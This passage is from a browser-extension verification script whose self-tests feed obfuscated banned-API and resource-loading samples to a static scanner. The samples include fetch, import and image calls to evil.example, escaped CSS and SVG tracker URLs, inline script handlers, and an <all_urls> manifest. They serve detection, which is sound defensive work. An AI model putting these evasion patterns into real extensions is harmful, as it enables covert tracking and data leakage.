      `for (author.${key} of values) {}`, `for (author.${key} in values) {}`,
    ]) cases.push([source, kind]);
    cases.push([`author[('${key}')] = value;`, 'dynamic property write']);
    for (const source of [
      `Reflect.set(author, '${key}', value);`, `Reflect['s'+'et'](author, '${escape}', value);`,
      `Object.assign(author, {'${key}': value});`, `Object['ass'+'ign'](author, {'${escape}': value});`,
      `Object.defineProperty(author, '${key}', {value});`,
      `Object.defineProperties(author, {'${key}': {value}});`,
      `Reflect.defineProperty(author, '${key}', {value});`,
      `Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, '${key}').set.call(author, value);`,
    ]) cases.push([source, 'reflective property mutation/extraction']);
    for (const source of [
      `({first: author.${key}, second: {value: other}} = input);`,
      `({first: author['${escape}'], second: {value: other}} = input);`,
      `({first: author.${key} = value, second: {value: other}} = input);`,
      `for ({first: author.${key}, second: {value: other}} of values) {}`,
      `for ([{first: author.${key}, second: {value: other}}] in values) {}`,
      `const {first = (author.${key} = value), second: {value: other}} = input;`,
      `function f({first = (author.${key} = value), second: {value: other}}) {}`,
    ]) cases.push([source, 'destructuring member access']);
    for (const source of [
      `author.setAttribute('${attribute}', value);`,
      `author['set'+'Attribute']('${attribute}', value);`,
      `author.setAttribute('\\u${attribute.charCodeAt(0).toString(16).padStart(4, '0')}${attribute.slice(1)}', value);`,
      `author.setAttribute('${attribute[0]}'+'${attribute.slice(1)}', value);`,
      `author.setAttribute('${attribute.toUpperCase()}', value);`,
      `author.setAttrib\\u0075te('${attribute}', value);`,
    ]) cases.push([source, 'banned API "resource attribute"']);
    for (const source of [
      `author.setAttributeNS(null, '${attribute}', value);`,
      `author['setAttributeNS']('namespace', '${attribute[0]}'+'${attribute.slice(1)}', value);`,
    ]) cases.push([source, 'banned API "namespaced resource attribute"']);
  }
  cases.push(
    ["author.ping = 'https://evil.example/ping';", 'resource property write'],
    ["author.ping = 'https://x.com/punkcan';", 'resource property write'],
    ['const key = "ping"; author[key] = value;', 'dynamic property write'],
    ['author[`pi${suffix}`] = value;', 'dynamic property write'],
    ['const {set: write} = Reflect; write(author, "ping", value);', 'reflective property mutation/extraction'],
    ['const {assign: write} = Object; write(author, {ping: value});', 'reflective property mutation/extraction'],
    ['const write = Object.defineProperty; write(author, "ping", {value});', 'reflective property mutation/extraction'],
    ['author.ping = value; author.search = "?x=1";', 'URL component write'],
  );
  for (const source of [
    "const write = author.setAttribute; write.call(author, 'ping', value);",
    "author.setAttribute.call(author, 'ping', value);",
    "const name = 'ping'; author.setAttribute(name, value);",
    "const write = author.setAttribute.bind(author); write('ping', value);",
    "author.setAttribute.apply(author, ['ping', value]);",
    "const {setAttribute: write} = author; write.call(author, 'ping', value);",
    "author['set'+'Attribute'](name, value);",
    "author.setAttrib\\u0075te(name, value);",
    "author.setAttributeNS(namespace, name, value);",
    "const write = author.setAttributeNS; write.call(author, null, 'ping', value);",
    'author.setAttributeNode(attribute);', 'author.setAttributeNodeNS(attribute);',
    'author.attributes.setNamedItem(attribute);', 'author.attributes.setNamedItemNS(attribute);',
  ]) cases.push([source, 'dynamic/extracted attribute mutation']);
  for (const [source, rule] of cases) {
    if (!scanSource(source, 'probe/reader.js').some(error => error.includes(rule))) throw new Error(`resource self-test: missed ${source}`);
  }
  for (const source of [
    'const ping = author.ping; const source = image.src; const policy = image.referrerPolicy;',
    'const style = {background: "white", color: "black"}; element.style.setProperty("background", style.background);',
    'const {first, second: {value: other}} = input;',
    'element.setAttribute("aria-label", label); element.setAttribute("data-xsched-host", "1");',
  ]) if (scanSource(source, 'probe/reader.js').length) throw new Error('resource self-test: safe source rejected');
  return cases.length;
}

export function cssResourceSelfTest() {
  // Keep the explicit function list/count independent of the guard's list.
  const names = ['url', 'src', 'image', 'image-set', '-webkit-image-set', 'cross-fade', '-webkit-cross-fade', 'element', '-moz-element', 'paint', '-webkit-canvas'];
  if (JSON.stringify(names) !== JSON.stringify(CSS_RESOURCE_FUNCTIONS)) throw new Error('CSS self-test: function list changed');
  const cases = [];
  for (const name of names) {
    const value = `${name}("https://evil.example/tracker.png" 1x)`;
    const literal = JSON.stringify(value);
    const declaration = JSON.stringify(`background-image: ${value}`);
    const rule = JSON.stringify(`.synthetic {background-image: ${value}}`);
    cases.push(
      `const value = ${literal};`,
      `author.style.setProperty('background-image', ${literal});`,
      `author.style.cssText = ${declaration};`,
      `author.style.backgroundImage = ${literal};`,
      `author.style['background-image'] = ${literal};`,
      `author.setAttribute('style', ${declaration});`,
      `Object.assign(author.style, {backgroundImage: ${literal}});`,
      `document.createElement('style').textContent = ${rule};`,
      `sheet.insertRule(${rule});`, `sheet.replace(${rule});`, `sheet.replaceSync(${rule});`,
      `new CSSStyleSheet().replaceSync(${rule});`,
      `CSSStyleSheet.prototype.insertRule.call(sheet, ${rule});`,
      `CSS.supports('background-image', ${literal});`,
      `author.style.setProperty('--synthetic-image', ${literal});`,
    );
    const first = name.charCodeAt(0).toString(16);
    const split = Math.max(1, Math.floor(name.length / 2));
    const head = JSON.stringify(name.slice(0, split));
    const tail = JSON.stringify(value.slice(split));
    cases.push(
      `const value = ${JSON.stringify(value.toUpperCase())};`,
      `const value = ${literal.replace(name[0], '\\u' + first.padStart(4, '0'))};`,
      `const value = ${literal.replace(name[0], '\\x' + first.padStart(2, '0'))};`,
      `const value = ${JSON.stringify('\\' + first + ' ' + value.slice(1))};`,
      `const value = ${JSON.stringify('\\' + first.padStart(6, '0') + value.slice(1))};`,
      `const value = ${JSON.stringify([...name].map(char => '\\' + char.charCodeAt(0).toString(16) + ' ').join('') + value.slice(name.length))};`,
      `const value = ${head} + ${tail};`,
      `const value = (${head}) + (${tail});`,
      `const value = ${head} /* split */ + ${tail};`,
      'const value = `' + value + '`;',
      'const value = `' + name.slice(0, split) + '${' + JSON.stringify(name.slice(split)) + '}' + value.slice(name.length) + '`;',
      `const value = ${literal.slice(0, 2)}\\\n${literal.slice(2)};`,
    );
  }
  cases.push(
    `author.style.setProperty('background-image', 'image-set("https://evil.example/tracker.png" 1x)');`,
    `const value = 'image-set("relative.png" 1x)';`,
    `const value = 'image-set("//evil.example/tracker.png" 1x)';`,
    `const value = 'image-set("data:image/png,synthetic" 1x)';`,
    `const value = 'image-set("https://x.com/punkcan" 1x)';`,
    `const value = '@import "relative.css"';`,
    `const value = ${JSON.stringify('@\\69 mport "relative.css"')};`,
    `const value = 'image/**/-set("relative.png" 1x)';`,
  );
  for (const source of cases) {
    if (!scanSource(source, 'probe/reader.js').includes('probe/reader.js: CSS image/resource value forbidden')) throw new Error(`CSS self-test: missed ${source}`);
  }
  // CSS files get the same CSS-level normalization without JS literal parsing.
  for (const source of [
    '.synthetic {background: image-set("relative.png" 1x)}',
    '.synthetic {background: im\\61 ge-set("relative.png" 1x)}',
    '@\\69 mport "relative.css";',
  ]) {
    cases.push(source);
    if (!scanSource(source, 'probe/synthetic.css').includes('probe/synthetic.css: CSS image/resource value forbidden')) throw new Error(`CSS self-test: missed stylesheet ${source}`);
  }
  for (const source of [
    'author.style.setProperty("background", "white");',
    'author.style.cssText = "display:flex;color:#123456";',
    'author.setAttribute("style", "position:fixed;opacity:1");',
    'sheet.insertRule(".synthetic {color: blue}");',
    'const gradient = "linear-gradient(red, blue)";',
    'const value = "radial-gradient(circle, red, blue)";',
    'const value = "translateY(10px) calc(100% - 20px)";',
    'const address = "https://x.com/punkcan";',
  ]) if (scanSource(source, 'probe/reader.js').length) throw new Error(`CSS self-test: safe source rejected ${source}`);
  if (!checkCssResources('const value = "unterminated', 'probe/reader.js').some(error => error.includes('failed closed'))) throw new Error('CSS self-test: literal failure passed');
  return cases.length;
}

function selfTest() {
  const violations = [
    'location.assign("https://evil.example/")', 'location.replace("/home")', 'location = "/home"',
    'a.setAttributeNS(null, "href", "https://evil.example/")',
    'range.createContextualFragment("<img>")', 'parser.parseFromString("<img>", "text/html")',
    "fetch/*comment*/('x')", "globalThis.fetch", 'window["fe"+"tch"]("x")',
    'navigator["sendBeacon"]("x")', 'window["XML" + "HttpRequest"]',
    'window["Web" + "Socket"]', 'globalThis["Event" + "Source"]',
    'window["\\u0066etch"]("x")', 'window.f\\u0065tch("x")',
    'document/*comment*/["write"]("x")', 'el["outer"+"HTML"]="x"',
    'window["ev"+"al"]("x")', 'new/*comment*/Function("x")',
    'import("https://evil.example/m.js")', 'import("./m.js")',
    'history["push"+"State"]({}, "", "/home")', 'chrome["storage"].local.set({})',
    'element["click"]()', 'element.scrollTop=10', 'img.src="https://evil.example/"',
    'img.setAttribute("src", "https://evil.example/a.png")', 'new Image()', '@import "https://evil.example/a.css";',
    'const url="https://evil.example/"; window["fe"+"tch"](url)',
  ];
  for (const source of violations) {
    if (!scanSource(source, "self-test").length) throw new Error(`self-test: missed ${source}`);
  }
  const storageCases = positionStorageSelfTest();
  const nativeCases = nativeWriterSelfTest();
  const authorCases = authorLinkSelfTest();
  const urlCases = urlMutationSelfTest();
  const boundaryCases = authorBoundarySelfTest();
  const destructuringCases = destructuringSelfTest();
  const resourceCases = resourcePropertySelfTest();
  const cssCases = cssResourceSelfTest();
  // Prove the scanner fails closed: a synthetic probe with a network call AND a bad
  // manifest must produce errors, while a clean synthetic probe must not.
  const dir = mkdtempSync(join(tmpdir(), "xsched-verify-selftest-"));
  try {
    const bad = join(dir, "bad");
    mkdirSync(bad);
    writeFileSync(join(bad, "evil.js"), "const r = fetch('https://evil.example/x');\n");
    writeFileSync(join(bad, "manifest.json"), JSON.stringify({
      manifest_version: 3,
      permissions: ["tabs"],
      host_permissions: ["<all_urls>"],
      content_scripts: [{ matches: ["<all_urls>"], js: ["evil.js"] }],
    }));
    const badResult = checkProbeDir(bad);
    if (badResult.errors.length === 0) {
      throw new Error("self-test: scanner did NOT flag a probe that calls fetch() with host_permissions");
    }
    const joined = badResult.errors.join("\n");
    if (!joined.includes("fetch(")) throw new Error("self-test: did not flag fetch(");
    if (!joined.includes("host_permissions")) throw new Error("self-test: did not flag host_permissions");
    if (!joined.includes("permissions")) throw new Error("self-test: did not flag permissions");

    const good = join(dir, "good");
    mkdirSync(good);
    writeFileSync(join(good, "ok.js"), "const el = document.createElement('div'); el.textContent = 'ok';\n");
    writeFileSync(join(good, "manifest.json"), JSON.stringify({
      manifest_version: 3,
      content_scripts: [{ matches: ["https://x.com/*"], js: ["ok.js"] }],
    }));
    const goodResult = checkProbeDir(good);
    if (goodResult.errors.length !== 0) {
      throw new Error(`self-test: scanner flagged a clean probe: ${goodResult.errors.join("; ")}`);
    }
    mkdirSync(join(good, "icons"));
    writeFileSync(join(good, "icons", "icon16.png"), readFileSync(join(PROBE, "icons", "icon16.png")));
    writeFileSync(join(good, "icons", "fake.png"), "not a PNG");
    const iconCases = [
      null, [], "icons/icon16.png", {}, { 64: "icons/icon16.png" },
      { 16: "../icon16.png" }, { 16: "icons/../icon16.png" }, { 16: "/icons/icon16.png" },
      { 16: "https://evil.example/icon16.png" }, { 16: "data:image/png;base64,x" },
      { 16: "icons\\icon16.png" }, { 16: "icons/missing.png" }, { 16: "icons/fake.png" },
      { 32: "icons/icon16.png" },
    ];
    for (const icons of iconCases) {
      if (!checkIconMap(icons, "self-test icons", good).length) throw new Error(`self-test: missed invalid icons ${JSON.stringify(icons)}`);
    }
    if (checkIconMap({ 16: "icons/icon16.png" }, "self-test icons", good).length) throw new Error("self-test: rejected valid local PNG icon");
    const cleanManifest = JSON.parse(readFileSync(join(good, "manifest.json"), "utf8"));
    if (checkManifest({ ...cleanManifest, action: { default_icon: { 16: "icons/icon16.png" } } }, "self-test action", good).length) throw new Error("self-test: rejected icon-only action");
    if (!checkManifest({ ...cleanManifest, action: { default_icon: { 16: "icons/icon16.png" }, default_popup: "popup.html" } }, "self-test action", good).length) throw new Error("self-test: allowed extra action field");
    const svg = (body) => `<svg xmlns="http://www.w3.org/2000/svg">${body}</svg>`;
    const svgCases = [
      svg("<script/>"), svg('<rect onclick="alert(1)"/>'), svg("<foreignObject/>"),
      svg('<path href="https://evil.example/"/>'), svg('<path fill="url(//evil.example/a.svg)"/>'),
      svg('<path href="&#104;ttps://evil.example/"/>'),
      svg('<path fill="u\\72l(\\68ttps://evil.example/a.svg)"/>'),
      '<!DOCTYPE svg SYSTEM "https://evil.example/a.dtd">' + svg(""),
      '<?xml-stylesheet href="https://evil.example/a.css"?>' + svg(""),
    ];
    for (const source of svgCases) if (!checkLogoSvg(source, "self-test SVG").length) throw new Error("self-test: missed unsafe SVG");
    if (checkLogoSvg(svg('<defs><clipPath id="local"><rect width="1" height="1"/></clipPath></defs><g clip-path="url(#local)"><path d="M0 0"/></g>')).length) throw new Error("self-test: rejected internal SVG clipPath");
    const attack = attackSelfTest();
    return { source: violations.length, icons: iconCases.length, svg: svgCases.length, attack: attack.secrets, storage:storageCases, native:nativeCases, author:authorCases, url:urlCases, boundary:boundaryCases, destructuring:destructuringCases, resource:resourceCases, css:cssCases };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function main() {
  const { errors, scanned } = checkProbeDir(PROBE);
  const problems = [...errors];
  let selfTests;
  // Static failures already prevented pure-module imports. Report that failure
  // without trying DOM self-tests against unavailable modules. Clean production
  // sources still run every self-test before they can receive an OK result.
  if (!errors.length) {
    try {
      selfTests = selfTest();
    } catch (err) {
      problems.push(`SELF-TEST FAILED: ${err.message}`);
    }
  }
  // Optional synthetic directory is checked in addition to the real probe. It must
  // never provide a way to skip the production guard.
  if (process.argv[2]) problems.push(...checkProbeDir(process.argv[2]).errors);
  const logos = checkLogoDir();
  problems.push(...logos.errors);

  if (problems.length) {
    console.error("verify: FAILED");
    for (const problem of problems) console.error("  ✖ " + problem);
    process.exit(1);
  }
  console.log(`verify: OK — ${scanned} files under probe/ and ${logos.scanned} Logo B SVGs scanned; ${selfTests.source} API bypass, ${selfTests.icons} icon, ${selfTests.svg} SVG, ${selfTests.attack} leak, ${selfTests.storage} storage, ${selfTests.native} native writer, ${selfTests.author} author-link, ${selfTests.url} URL mutation, ${selfTests.boundary} author boundary, ${selfTests.destructuring} destructuring self-tests; ${selfTests.resource} resource property self-tests; ${selfTests.css} CSS resource self-tests; no banned APIs, minimal permissions.`);
}

// Run static checks before executing even the two pure modules. A prohibited call
// introduced at module scope must be rejected without ever running it.
if (checkProbeDir(PROBE).errors.length === 0) {
  await import(join(PROBE, "reader.js"));
  await import(join(PROBE, "skeleton.js"));
  READER = globalThis.XSCHED_READER;
  SKELETON = globalThis.XSCHED_SKELETON;
}
if (import.meta.url === `file://${process.argv[1]}`) main();
